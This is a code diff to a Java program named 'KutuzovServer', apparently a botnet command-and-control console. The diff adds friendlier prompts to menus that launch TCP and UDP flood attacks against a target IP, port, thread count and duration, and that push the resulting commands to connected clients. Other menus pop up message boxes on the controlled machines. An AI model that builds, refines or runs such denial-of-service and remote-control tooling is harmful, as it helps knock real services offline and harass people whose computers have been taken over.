@@ -149,14 +149,22 @@ public class KutuzovServer {
             case 1: {
                 clearConsole();
                 pnl("TCP Flood attack:");
-                pwl(" IP=");
+                pnl("Please enter the IP address of the target: ");
+                pwl("IP=");
                 String ip = readLine();
-                pwl(" Port=");
+
+                pnl("Please enter the port of the target: ");
+                pwl("Port=");
                 int port = Integer.parseInt(readLine());
-                pwl(" Threads=");
+
+                pnl("Please enter the amount of threads: ");
+                pwl("Threads=");
                 int threads = Integer.parseInt(readLine());
-                pwl(" Time(s)=");
+
+                pnl("Please enter the amount of time: ");
+                pwl("Time(s)=");
                 int time = Integer.parseInt(readLine())*1000;
+
                 String data = String.format("tcp;%s;%s;%s;%s", ip, port, threads, time);
 
                 packet_csda(data, null);
@@ -164,14 +172,22 @@ public class KutuzovServer {
             case 2: {
                 clearConsole();
                 pnl("UDP Flood attack:");
+                pnl("Please enter the IP address of the target: ");
                 pwl(" IP=");
                 String ip = readLine();
+
+                pnl("Please enter the port of the target: ");
                 pwl(" Port=");
                 int port = Integer.parseInt(readLine());
+
+                pnl("Please enter the amount of threads: ");
                 pwl(" Threads=");
                 int threads = Integer.parseInt(readLine());
+
+                pnl("Please enter the amount of time: ");
                 pwl(" Time(s)=");
                 int time = Integer.parseInt(readLine())*1000;
+
                 String data = String.format("udp;%s;%s;%s;%s", ip, port, threads, time);
 
                 packet_csda(data, null);
@@ -203,14 +219,23 @@ public class KutuzovServer {
             case 2: {
                 String protocol = option == 1? "tcp" : "udp";
                 pnl(protocol.toUpperCase(Locale.ROOT) + " Flood attack:");
-                pwl(" IP=");
+
+                pnl("Please enter the IP address of the target: ");
+                pwl("IP=");
                 String ip = readLine();
-                pwl(" Port=");
+
+                pnl("Please enter the port of the target: ");
+                pwl("Port=");
                 int port = Integer.parseInt(readLine());
-                pwl(" Threads=");
+
+                pnl("Please enter the amount of threads: ");
+                pwl("Threads=");
                 int threads = Integer.parseInt(readLine());
-                pwl(" Time(s)=");
+
+                pnl("Please enter the amount of time: ");
+                pwl("Time(s)=");
                 int time = Integer.parseInt(readLine())*1000;
+
                 String data = String.format(protocol + ";%s;%s;%s;%s", ip, port, threads, time);
 
                 packet_csda(data, client);
@@ -242,6 +267,7 @@ public class KutuzovServer {
         switch (option) {
             case 1: {
                 clearConsole();
+                pnl("Please enter the amount of time(ms):");
                 pwl("Time(ms): ");
                 int time = Integer.parseInt(readLine());
                 try {
@@ -389,10 +415,15 @@ public class KutuzovServer {
         switch (option) {
             case 1: {
                 clearConsole();
+                pnl("Please enter the title of the messagebox: ");
                 pwl("Title: ");
                 String title = readLine();
+
+                pnl("Please enter the message: ");
                 pwl("Content: ");
                 String content = readLine();
+
+                pnl("Please enter the amount of messageboxes: ");
                 pwl("Amount: ");
                 int amount = Integer.parseInt(readLine());
 
@@ -475,10 +506,15 @@ public class KutuzovServer {
         switch (option) {
             case 1:
                 clearConsole();
-                pwl("Enter the title: ");
+                pnl("Please enter the title of the message box:");
+                pwl("Title: ");
                 String title = readLine();
+
+                pnl("Please enter the content of the message box:");
                 pwl("Enter the content: ");
                 String content = readLine();
+
+                pnl("Please enter the amount of message boxes:");
                 pwl("Enter the amount: ");
                 int amount = Integer.parseInt(readLine());
 
